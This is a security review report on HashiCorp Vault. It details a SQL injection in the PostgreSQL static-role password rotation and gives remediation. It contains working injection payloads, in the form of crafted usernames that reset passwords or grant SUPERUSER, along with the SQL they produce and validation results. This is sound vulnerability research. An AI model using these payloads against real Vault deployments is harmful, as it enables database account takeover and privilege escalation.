# Application Security Review — Vault @ 0513545dd

**Commit:** `0513545dd8213ffcbb3406c25cda69cd0a5b0e47`  
**Tree:** `1.18.0-beta1`  
**Hunt areas:** RabbitMQ DisplayName injection, AWS STS/session policy, identity merge races, JWT bound_claims, cert OCSP/CRL, sys/audit|mounts authz, UI Ember XSS, agent/proxy auto-auth, physical backends, plugin SQL/LDAP/shell `fmt.Sprintf`

**Skip list honored:** OpenLDAP LDIF/DN DisplayName; Elasticsearch path.Join; CVE-2025-6000/5999/11621/6037/6013/6014/6015/6004/3879; CVE-2026-5052/39946/5006/3605/5807/12624; MSSQL/Redshift/HANA/Snowflake/MySQL SQLi; SSH CVE-2024-7594 + allowed_users_template; GitHub Name/Slug; Duo MFA IP; UI OIDC redirect_uri; RADIUS case; cert renewal AND/OR; ACL +/* wildcards; recovery-mode timing; templated ACL slash; generate-root DoS.

---

## Finding 1 — HIGH — PostgreSQL static-role default password rotation: double-quote identifier breakout (SQL injection)

**Distinct from CVE-2026-39946** (unquoted schema name in `defaultDeleteUser` REVOKE). This bug is in the **password-rotation** path used by static roles.

| Field | Value |
| --- | --- |
| **Severity** | High |
| **CWE** | CWE-89 |
| **Attacker** | Authenticated Vault principal with `create`/`update` on `database/static-roles/*` for a PostgreSQL connection (common delegated DB-onboarding privilege; not root) |
| **Controlled input** | Static-role `username` (`framework.TypeString`, no identifier validation) |
| **Impact** | Arbitrary SQL as the Vault PostgreSQL management role (often SUPERUSER / CREATEROLE): reset other roles’ passwords, grant SUPERUSER, drop roles, etc. |

### Attack path

1. Admin configures `database/config/<conn>` with `postgresql-database-plugin` and a privileged management user.
2. Attacker creates a static role with a malicious `username` and empty / omitted `rotation_statements` (defaults apply; also works when policy uses `denied_parameters = ["rotation_statements"]`):

   ```
   username = appuser" WITH PASSWORD 'pwned'; --
   ```

   or

   ```
   username = appuser" WITH SUPERUSER; --
   ```

3. `setStaticAccount` → plugin `UpdateUser` → `changeUserPassword` substitutes into the default template via unescaped `QueryHelper` / `ExecuteTxQueryDirect`.
4. Resulting SQL (single statement + SQL comment — no multi-statement driver support required for the password-reset variant):

   ```sql
   ALTER ROLE "appuser" WITH PASSWORD 'pwned'; --" WITH PASSWORD 'vault-rotated-secret';
   ```

5. Existence check uses a bound parameter on the **raw** malicious username string, finds no role, and **ignores** the result (`exists` is never consulted), so rotation still proceeds.

### Evidence (code)

Default template (manual double quotes, not `QuoteIdentifier`):

```30:32:plugins/database/postgresql/postgresql.go
	defaultChangePasswordStatement = `
ALTER ROLE "{{username}}" WITH PASSWORD '{{password}}';
`
```

Empty statements → default; raw map substitution; unused `exists`:

```164:218:plugins/database/postgresql/postgresql.go
func (p *PostgreSQL) changeUserPassword(ctx context.Context, username string, changePass *dbplugin.ChangePassword) error {
	stmts := changePass.Statements.Commands
	if len(stmts) == 0 {
		stmts = []string{defaultChangePasswordStatement}
	}
	// ...
	var exists bool
	err = db.QueryRowContext(ctx, "SELECT exists (SELECT rolname FROM pg_roles WHERE rolname=$1);", username).Scan(&exists)
	// exists is never checked
	// ...
			m := map[string]string{
				"name":     username,
				"username": username,
				"password": password,
			}
			if err := dbtxn.ExecuteTxQueryDirect(ctx, tx, m, query); err != nil {
```

Static-role username accepted as unconstrained string:

```191:194:builtin/logical/database/path_roles.go
		"username": {
			Type: framework.TypeString,
			Description: `Name of the static user account for Vault to manage.
```

Contrast — `dbutil.QuoteIdentifier` doubles embedded `"` and would neutralize breakout (used elsewhere in the same file for revoke/drop).

### E2E validation (PostgreSQL 16, jackc/pgx/v4 stdlib — same driver as the plugin)

Management role: `vaultadmin` (SUPERUSER). Victim role: `appuser` with password `original`.

1. **Password overwrite**

   - Payload username: `appuser" WITH PASSWORD 'pwned'; --`
   - Executed SQL: `ALTER ROLE "appuser" WITH PASSWORD 'pwned'; --" WITH PASSWORD 'vault-rotated-secret';`
   - `exists(payload)=false` (ignored)
   - Result: `appuser` authenticates with `pwned`; `original` rejected.

2. **SUPERUSER escalation**

   - Payload username: `appuser" WITH SUPERUSER; --`
   - Executed SQL: `ALTER ROLE "appuser" WITH SUPERUSER; --" WITH PASSWORD 'vault-rotated-secret';`
   - Result: `pg_authid.rolsuper` for `appuser` became true.

### Remediation

- Build default rotation/expiration SQL with `dbutil.QuoteIdentifier(username)` and proper password literal escaping (or parameterized/`quote_literal` forms).
- Reject static-role usernames that are not valid PostgreSQL identifiers.
- Honor the existence check (fail closed if the bound-parameter lookup returns false) as defense-in-depth.

---

## Other hunt areas — no new Medium+ after skip list

| Area | Result |
| --- | --- |
| RabbitMQ DisplayName / vhost / tags | Management API paths use `url.PathEscape`; default username template includes UUID; tags come from admin role config. No low-priv injection without unsafe custom `username_template`. |
| AWS STS session policy / `role_arn` | Caller-supplied `role_arn` must be in role allowlist; session policy comes only from role config / IAM groups, not the creds reader. |
| Identity group membership / alias merge | External-group refresh recomputes under `groupLock`; force-merge paths require identity ACL. No defended low-priv takeover beyond known root-policy case CVE. |
| JWT `bound_claims` JSON pointer / glob | Matching behaves as designed in `vault-plugin-auth-jwt@v0.20.3`; no new bypass validated. |
| Cert OCSP/CRL | Fail-open / AIA fetch are config-driven; CRL URL write is auth-admin. No new issue beyond known cert CN non-CA CVE. |
| `sys/audit`, `sys/mounts` authz | `audit`/`audit/*` are Root/sudo; mounts tune dual-path is documented intentional. |
| UI Ember XSS | Control-group console uses `{{{}}}` but content is mostly self-reflected path/token; no cross-user Vault-reflected XSS validated. |
| Agent/proxy auto-auth | Symlink handling is intentional/configurable; network-exposed cache/metrics are trust-boundary by design. |
| Physical backends | File backend rejects `..`. |
| Plugin SQL besides this finding | Postgres schema REVOKE = CVE-2026-39946 (skipped); MSSQL/HANA/Redshift/MySQL/Snowflake rotation/revoke classes skipped. |

**Verdict:** 1 validated High finding (PostgreSQL static-role default rotation quote breakout).
